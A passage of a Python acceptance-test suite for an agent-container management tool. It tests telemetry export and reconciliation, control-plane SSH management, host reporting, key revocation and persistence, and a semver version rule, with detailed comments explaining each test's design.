                    f"the task marker {marker} at the collector")  # fmt: skip

    with _collector("accept", 9534) as log2:
        _settings(acc, otlp_endpoint=_collector_url(9534), export_task_text=False)
        _headless_run(acc, "exptask2", marker)
        _wait_until(lambda: log2.exists() and log2.stat().st_size > 0, "a record at the collector")
        body = log2.read_text(errors="replace")
    assert marker not in body, (
        "export_task_text: false did not remove the task text — the exclusion is "
        "not wired, and an operator who set it believes their tasks are private"
    )
    # AND the record still correlates, or the exclusion is lossy rather than cheap.
    assert "agent_container.run_id" in body, (
        "run_id did not export alongside the excluded task, so a collector record "
        "cannot be matched to its local counterpart (C18f)"
    )


def test_an_agent_container_exports_with_NO_control_plane_deployed(acc):
    """T060 / S12 / SC-018 / C18d — the half that gets missed if export is built
    as control-plane plumbing."""
    with _collector("accept", 9535) as log:
        _settings(acc, otlp_endpoint=_collector_url(9535))
        _headless_run(acc, "expplain", "no-control-plane-here")
        _wait_until(lambda: log.exists() and log.stat().st_size > 0,
                    "a record from an ordinary agent container")  # fmt: skip
        body = log.read_text(errors="replace")
    assert "agent_container.run_id" in body
    # SCOPED TO THIS TEST'S OWN STATE, not to the daemon. The first version
    # asserted no `agent-container-hub*` container existed anywhere, which made it
    # depend on every other test's teardown — and it duly failed on a leaked
    # container from a test that had crashed. A global assertion in a tier that
    # shares one daemon is a cross-test dependency wearing an assertion's clothes.
    ports = (acc.state_dir / "agent-container" / "local").glob("*.port")
    deployed = sorted(f.stem for f in ports)
    assert not any(n.startswith("hub") for n in deployed), (
        f"this test deployed a control plane: {deployed}"
    )


def test_collect_works_with_AND_without_an_endpoint(acc):
    """T069 / S16 — both configurations deliberately.

    One that only worked without an endpoint would leave an operator who
    configured OTLP holding logs with no way to download them.
    """
    # WITHOUT.
    _settings(acc)
    _headless_run(acc, "collnone", "without-endpoint")
    r1 = acc.cli(["telemetry", "collect", "--json"])
    assert r1.returncode == 0, f"collect failed with no endpoint declared:\n{r1.stderr}"
    assert _record_states(acc), "collect retrieved nothing with no endpoint declared"

    # WITH.
    with _collector("accept", 9536):
        _settings(acc, otlp_endpoint=_collector_url(9536))
        _headless_run(acc, "collwith", "with-endpoint")
        r2 = acc.cli(["telemetry", "collect", "--json"])
    assert r2.returncode == 0, f"collect failed with an endpoint declared:\n{r2.stderr}"
    data = json.loads(r2.stdout).get("data", {})
    assert data.get("complete") is True, f"collect reported an incomplete trail: {data}"


def test_the_exported_trail_survives_the_destruction_of_its_host(acc):
    """T071 / SC-014 — tamper-evidence, measured by DESTROYING.

    A trail the audited party can rewrite is not evidence, and only the negative
    case proves it. Asserted by removing the container AND its volumes — the
    local record is gone, the collector's copy is not.
    """
    with _collector("accept", 9537) as log:
        _settings(acc, otlp_endpoint=_collector_url(9537))
        _headless_run(acc, "tamper", "evidence-9f2b")
        _wait_until(lambda: log.exists() and "evidence-9f2b" in log.read_text(errors="replace"),
                    "the record at the collector")  # fmt: skip
        # DESTROY the source, volumes and all.
        acc.down("tamper", purge=True)
        assert not acc.volumes_of("tamper"), "purge left volumes behind"
        surviving = log.read_text(errors="replace")
    assert "evidence-9f2b" in surviving, (
        "the collector's copy did not survive the destruction of the environment "
        "that produced it — the exported trail is not evidence"
    )


def test_manage_the_fleet_from_INSIDE_the_control_plane(acc, _control_plane_image):
    """T016 / S1 / C1 / SC-001 — the MVP, end to end.

    From a client with nothing installed: SSH in, `list`, then `stop` something.
    Configuring NOTHING on arrival is the whole claim, so the test does not write
    a config file into the container first.
    """
    laptop = _gen_keypair(acc.tmp / "cplaptop")
    port = acc.up(
        "hub7",
        role="control-plane",
        authorized_key=[laptop.with_suffix(".pub")],
        # The label-based `stop` fallback is new in 017, so the CLI installed in
        # the image does not have it and this test would measure the released one.
        mount=[_cli_mount()],
    )
    acc.up("managed", wait=False, mode="headless", task="sleep 300")

    listed = _ssh(port, laptop, f"python3 {_CLI_UNDER_TEST} list --json")
    assert listed.returncode == 0, f"`list` failed inside the control plane:\n{listed.stderr}"
    payload = json.loads(listed.stdout)
    data = payload.get("data", payload)
    assert "containers" in data, f"no container listing came back: {data}"

    # `stop` REACHES THE LABEL FALLBACK, which is what this feature added and what
    # this tier can prove on one machine.
    #
    # It cannot complete: a control plane reaches daemons over docker CONTEXTS
    # (ssh:// in a real deployment), and this test registers no host — so the only
    # target is the operator's local daemon, whose socket is deliberately not
    # reachable from inside a container (Constitution II). Giving it one would test
    # a transport the design does not use.
    #
    # So the assertion is on WHICH PATH IT TOOK. Before the fallback existed,
    # `stop` refused with "no deployment named 'managed'" because there was no
    # local compose file — a control plane has none for anything, which made
    # SC-001's "list then stop" impossible. Now it gets as far as asking the host
    # what is running for that compose project, and fails on REACHABILITY.
    #
    # That distinction is the whole product change: one is "I will not try", the
    # other is "I tried and could not reach the daemon".
    stopped = _ssh(port, laptop, f"python3 {_CLI_UNDER_TEST} stop managed")
    combined = stopped.stdout + stopped.stderr
    assert "no deployment named" not in combined, (
        "`stop` still refuses for lack of a local compose file, so a control plane "
        f"cannot act on what `list` shows it:\n{combined}"
    )
    assert "could not ask" in combined or stopped.returncode == 0, (
        f"`stop` neither reached the label lookup nor succeeded:\n{combined}"
    )


def test_an_unreachable_permitted_host_is_NAMED_never_omitted(acc, _control_plane_image):
    """T017 / S2 / C2 / SC-002.

    A short list that looks complete is worse than an error, because the operator
    acts on absence. Registers a host that cannot answer and asserts it is
    reported rather than dropped.
    """
    # ASSERTED. The first version ignored this, so when the registration did not
    # take, `list` correctly reported no hosts and the test failed claiming the
    # product had not named an unreachable host — blaming the code for the
    # harness. Any setup step whose success the assertion depends on has to be
    # checked, or the failure message points at the wrong thing.
    # `--address` MATTERS HERE, and its absence is why the first version of this
    # test failed. `driver_reachable_address` defaults to "localhost" when a host
    # has no address, so `host_is_local` reports True and `gather_rows` treats the
    # host as a LOCAL ALIAS — never querying it, and therefore never marking it
    # unreachable. A registered-but-addressless docker context is assumed to point
    # at the local daemon.
    #
    # An RFC 5737 documentation address (203.0.113.0/24 is reserved and
    # unroutable), so the host is unmistakably remote and cannot accidentally
    # resolve to something real on a developer's network.
    add = acc.cli([
        "host", "add", "deadvps",
        "--docker-context", "nonexistent-ctx-xyz",
        "--address", "203.0.113.253",
    ])  # fmt: skip
    assert add.returncode == 0, f"could not register the unreachable host:\n{add.stderr}"
    listed = acc.cli(["host", "ls", "--json"])
    assert "deadvps" in listed.stdout, f"the host did not persist: {listed.stdout[:300]}"
    r = acc.cli(["list", "--json"])
    assert r.returncode == 0, f"`list` failed with an unreachable host registered:\n{r.stderr}"
    data = json.loads(r.stdout).get("data", {})
    assert "deadvps" in (data.get("unreachable_hosts") or []), (
        f"an unreachable host was not named: {data}"
    )
    assert data.get("complete") is False, (
        "the listing claimed to be complete while a host had not answered"
    )


def test_management_output_is_legible_at_80_COLUMNS(acc, _control_plane_image):
    """T018 / S11 / C11 / SC-007 — measured, not asserted about.

    Run inside the container with COLUMNS=80 and a TTY, then check no line
    overflows. A width-dependent renderer that only ever ran wide would pass a
    shape assertion and fail an operator on a phone.
    """
    port = acc.up("hub8", role="control-plane",
                  authorized_key=[_gen_keypair(acc.tmp / "cols").with_suffix(".pub")],
                  mount=[_cli_mount()])  # fmt: skip
    key = acc.tmp / "cols"
    # `-tt` forces a pty, so the CLI measures a terminal rather than a pipe.
    #
    # And the WORKING-TREE CLI, not the installed one: narrow rendering is new in
    # 017, so the released copy inside the image renders the wide form and this
    # would measure the wrong binary (see _exec_working_tree_cli).
    r = _ssh(
        port, key,
        f"stty cols 80 2>/dev/null; COLUMNS=80 python3 {_CLI_UNDER_TEST} list",
        tty=True,
    )  # fmt: skip
    assert r.returncode == 0, f"`list` failed at 80 columns:\n{r.stderr}"
    over = [ln for ln in r.stdout.splitlines() if len(ln.rstrip("\r\n")) > 80]
    assert not over, f"lines exceed 80 columns inside the control plane: {over[:3]}"


def test_revoke_ends_access_with_no_per_host_reconfiguration(acc, _control_plane_image):
    """T026 / S7 / C7 / SC-005 — one command, not N hosts.

    Runs against the implicit local host, which has no shell path, so the honest
    outcome is `unsupported` with the manual step named — and the run FAILS. That
    is the property under test: a revocation that could not be confirmed must not
    report success, because an operator who believes a key is gone stops looking.
    """
    acc.up("hub9", role="control-plane")
    r = acc.cli(["revoke", "hub9", "-y", "--json"])
    data = json.loads(r.stdout).get("data", {})
    outcomes = {row["host"]: row["outcome"] for row in data.get("results", [])}
    assert outcomes, f"revoke visited no hosts: {data}"
    assert all(
        o in ("withdrawn", "absent", "unsupported", "undetermined") for o in outcomes.values()
    )
    if any(o in ("unsupported", "undetermined") for o in outcomes.values()):
        assert r.returncode != 0, (
            "revoke could not confirm on every host and still exited 0 — an operator "
            "would believe the key was withdrawn"
        )
        assert data.get("ok") is False


def test_after_stop_start_the_key_is_LOCKED_and_needs_no_reconfiguration(acc, _control_plane_image):
    """T027 / S5 / C5 / FR-012.

    Recovery must not require the operator's own machine: the key persists on its
    volume and the passphrase is supplied on connect. Comes back LOCKED, which is
    harmless — a control plane has no unattended work.
    """
    acc.up("hub10", role="control-plane")
    before = subprocess.run(
        [RUNTIME, "exec", "agent-container-hub10", "sh", "-c",
         "sha256sum /home/dev/.ssh/id_ed25519 | cut -d' ' -f1"],
        capture_output=True, text=True, timeout=120,
    )  # fmt: skip
    acc.cli(["stop", "hub10"])
    acc.cli(["start", "hub10"])
    _wait_sshd(
        int((acc.state_dir / "agent-container" / "local" / "hub10.port").read_text().strip())
    )
    after = subprocess.run(
        [RUNTIME, "exec", "agent-container-hub10", "sh", "-c",
         "sha256sum /home/dev/.ssh/id_ed25519 | cut -d' ' -f1; "
         "ssh-add -l >/dev/null 2>&1 && echo AGENT_HAS_KEYS || echo LOCKED"],
        capture_output=True, text=True, timeout=120,
    )  # fmt: skip
    digest_after, _, lock_state = after.stdout.partition("\n")
    assert before.stdout.strip() == digest_after.strip(), (
        "the keypair changed across stop/start — every authorisation the operator "
        "made is now invalid, and nothing said so"
    )
    assert "LOCKED" in lock_state, (
        "the key is loaded into an agent after a restart, so it is usable with "
        "nobody attached — the property FR-007a refuses"
    )


def test_the_semver_rule_is_silent_advisory_or_REFUSED(acc, _control_plane_image):
    """T036 / S10 / C10 / SC-012, exercised through the real comparison.

    Driven through the CLI's own resolver rather than by constructing versions in
    Python, so what is measured is the rule an operator meets.
    """
    r = acc.cli(["--self-test"])
    assert r.returncode == 0, f"the doctests covering the semver rule failed:\n{r.stdout[-2000:]}"
    # The three verdicts, through the WORKING-TREE CLI running inside the
    # control-plane image — which is where FR-016 actually executes.
    #
    # Not the installed copy: it is the last released CLI and has no
    # `version_verdict`, so the first version of this probe was wrapped in
    # `if probe.returncode == 0` and silently proved nothing. A tolerant probe
    # that skips itself is worse than no probe, because it reads as coverage.
    probe = subprocess.run(
        [RUNTIME, "run", "--rm", "-v", _cli_mount(), "--entrypoint", "python3",
         _control_plane_image, "-c",
         f"import runpy;m=runpy.run_path({_CLI_UNDER_TEST!r});"
         "print(m['version_verdict']('0.32.0','0.32.5'),"
         "m['version_verdict']('0.33.0','0.32.0'),m['version_verdict']('0.32.0','0.33.0'))"],
        capture_output=True, text=True, timeout=180,
    )  # fmt: skip
    assert probe.returncode == 0, (
        f"the semver rule could not be evaluated inside the control-plane image, "
        f"which is where FR-016 runs:\n{probe.stderr[-1500:]}"
    )
    assert probe.stdout.split() == ["ok", "advisory", "refused"], probe.stdout


def test_run_id_exports_whatever_the_task_setting(acc):
    """T065 / S15 / SC-019 / C18f.

    Correlation is what makes excluding the task cheap rather than lossy: without
    it, the exclusion removes the reason to look at the record at all. Asserted in
    BOTH settings, because a run_id that only survived the default would leave the
    excluded case uncorrelatable — exactly the configuration where correlation is
    the only thing left.
    """
    for port, exclude in ((9538, False), (9539, True)):
        with _collector("accept", port) as log:
            if exclude:
                _settings(acc, otlp_endpoint=_collector_url(port), export_task_text=False)
            else:
                _settings(acc, otlp_endpoint=_collector_url(port))
            name = f"corr{port}"
            _headless_run(acc, name, "correlate-me")
            _wait_until(lambda lg=log: lg.exists() and lg.stat().st_size > 0,
                        "a record at the collector")  # fmt: skip
            body = log.read_text(errors="replace")
        assert "agent_container.run_id" in body, (
            f"run_id did not export with export_task_text={not exclude}"
        )
        ids = _collector_run_ids(log)
        assert ids, f"no usable run id reached the collector (exclude={exclude}): {body[:400]}"


def test_the_two_legs_RECONCILE_over_a_window(acc):
    """S19 / SC-020 / C17 — the reconciliation, end to end.

    Hermetic tests pin the window arithmetic and the both-directions reporting.
    This is the part they cannot show: that the ids a real exporter sent and the
    ids the local leg marked `accepted` are THE SAME SET, which is only true
    because both legs carry identical payloads from one definition.

    A divergence is then INJECTED, because agreement on a healthy system proves
    only that the comparison runs. The direction chosen is the serious one: a
    record marked accepted locally that the collector does not hold.
    """
    with _collector("accept", 9540) as log:
        _settings(acc, otlp_endpoint=_collector_url(9540))
        _headless_run(acc, "recon", "reconcile-me")
        _wait_until(lambda: log.exists() and log.stat().st_size > 0, "a record at the collector")
        acc.cli(["telemetry", "collect"])
        collector_ids = _collector_run_ids(log)

    assert collector_ids, "no run ids reached the collector"
    ids_file = acc.tmp / "collector-ids.txt"
    ids_file.write_text("\n".join(collector_ids) + "\n")

    # AGREEMENT.
    r = acc.cli(["telemetry", "reconcile",
                 "--collector-ids", str(ids_file), "--json"])  # fmt: skip
    data = json.loads(r.stdout).get("data", {})
    assert data.get("compared") is True, f"no comparison was made: {data}"
    assert data.get("agree") is True, (
        f"the legs disagreed on a healthy system.\n"
        f"  collector ids ({len(collector_ids)}): {collector_ids}\n"
        f"  payload: {data}\n"
        f"`missing_at_collector` means the local leg claims a delivery that did "
        f"not land; `unknown_locally` means the collector holds something this "
        f"machine never marked accepted."
    )
    assert r.returncode == 0

    # INJECTED DIVERGENCE — remove one id from the collector's side and require it
    # to be REPORTED and to fail the run. Agreement alone would prove only that
    # the comparison executes.
    #
    # `--since` IS REQUIRED HERE, and that is the design working rather than a
    # workaround. The agreeing run above advanced the reconcile watermark, so this
    # run's DEFAULT window starts after those records — correctly, because they are
    # settled. Without an explicit range it compares an empty window and agrees,
    # which is exactly what the first version of this test measured.
    #
    # A LIMITATION WORTH STATING: once a window has agreed, a record the collector
    # later LOSES falls outside every subsequent default window and is not
    # detected. That is inherent to windowing, which C17 chose deliberately, and
    # the operator-supplied range exists for precisely this — re-examining settled
    # history.
    ids_file.write_text("\n".join(collector_ids[1:]) + "\n")
    r2 = acc.cli(["telemetry", "reconcile", "--since", "2000-01-01T00:00:00Z",
                  "--collector-ids", str(ids_file), "--json"])  # fmt: skip
    data2 = json.loads(r2.stdout).get("data", {})
    assert data2.get("agree") is False, f"a removed record was not detected: {data2}"
    assert collector_ids[0] in (data2.get("missing_at_collector") or []), (
        f"divergence was detected but the record was not NAMED: {data2}"
    )
    assert r2.returncode != 0, "a divergent reconciliation exited 0"
